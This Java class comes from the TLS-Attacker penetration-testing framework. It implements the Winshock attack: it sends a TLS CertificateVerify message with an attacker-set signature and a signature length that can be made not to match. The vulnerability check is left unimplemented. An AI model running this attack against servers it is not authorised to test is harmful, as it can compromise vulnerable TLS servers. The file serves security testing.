/**
 * TLS-Attacker - A Modular Penetration Testing Framework for TLS
 *
 * Copyright 2014-2017 Ruhr University Bochum / Hackmanit GmbH
 *
 * Licensed under Apache License 2.0
 * http://www.apache.org/licenses/LICENSE-2.0
 */
package de.rub.nds.tlsattacker.attacks.impl;

import de.rub.nds.modifiablevariable.bytearray.ByteArrayModificationFactory;
import de.rub.nds.modifiablevariable.bytearray.ModifiableByteArray;
import de.rub.nds.modifiablevariable.integer.IntegerModificationFactory;
import de.rub.nds.modifiablevariable.integer.ModifiableInteger;
import de.rub.nds.modifiablevariable.util.ArrayConverter;
import de.rub.nds.tlsattacker.attacks.config.WinshockCommandConfig;
import de.rub.nds.tlsattacker.core.config.Config;
import de.rub.nds.tlsattacker.core.constants.HandshakeMessageType;
import de.rub.nds.tlsattacker.core.protocol.message.CertificateVerifyMessage;
import de.rub.nds.tlsattacker.core.state.State;
import de.rub.nds.tlsattacker.core.workflow.WorkflowExecutor;
import de.rub.nds.tlsattacker.core.workflow.WorkflowExecutorFactory;
import de.rub.nds.tlsattacker.core.workflow.WorkflowTrace;
import de.rub.nds.tlsattacker.core.workflow.WorkflowTraceUtil;
import de.rub.nds.tlsattacker.core.workflow.factory.WorkflowConfigurationFactory;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

/**
 * Allows to execute the Winshock attack, by setting the CertificateVerify
 * protocol message properties. I
 */
public class WinshockAttacker extends Attacker<WinshockCommandConfig> {

    private static final Logger LOGGER = LogManager.getLogger(WinshockAttacker.class);

    public WinshockAttacker(WinshockCommandConfig config) {
        super(config, false);
    }

    @Override
    public void executeAttack() {
        Config tlsConfig = config.createConfig();
        tlsConfig.setClientAuthentication(true);
        WorkflowTrace trace = new WorkflowConfigurationFactory(tlsConfig).createHandshakeWorkflow();
        State state = new State(tlsConfig, trace);
        ModifiableByteArray signature = new ModifiableByteArray();
        signature.setModification(ByteArrayModificationFactory.explicitValue(ArrayConverter
                .bigIntegerToByteArray(config.getSignature())));
        ModifiableInteger signatureLength = new ModifiableInteger();
        if (config.getSignatureLength() == null) {
            signatureLength.setModification(IntegerModificationFactory.explicitValue(signature.getValue().length));
        } else {
            signatureLength.setModification(IntegerModificationFactory.explicitValue(config.getSignatureLength()));
        }
        CertificateVerifyMessage cvm = (CertificateVerifyMessage) WorkflowTraceUtil.getFirstSendMessage(
                HandshakeMessageType.CERTIFICATE_VERIFY, trace);
        cvm.setSignature(signature);
        cvm.setSignatureLength(signatureLength);
        WorkflowExecutor workflowExecutor = WorkflowExecutorFactory.createWorkflowExecutor(
                tlsConfig.getWorkflowExecutorType(), state);
        workflowExecutor.executeWorkflow();
    }

    @Override
    public Boolean isVulnerable() {
        throw new UnsupportedOperationException("Not implemented yet");
    }
}
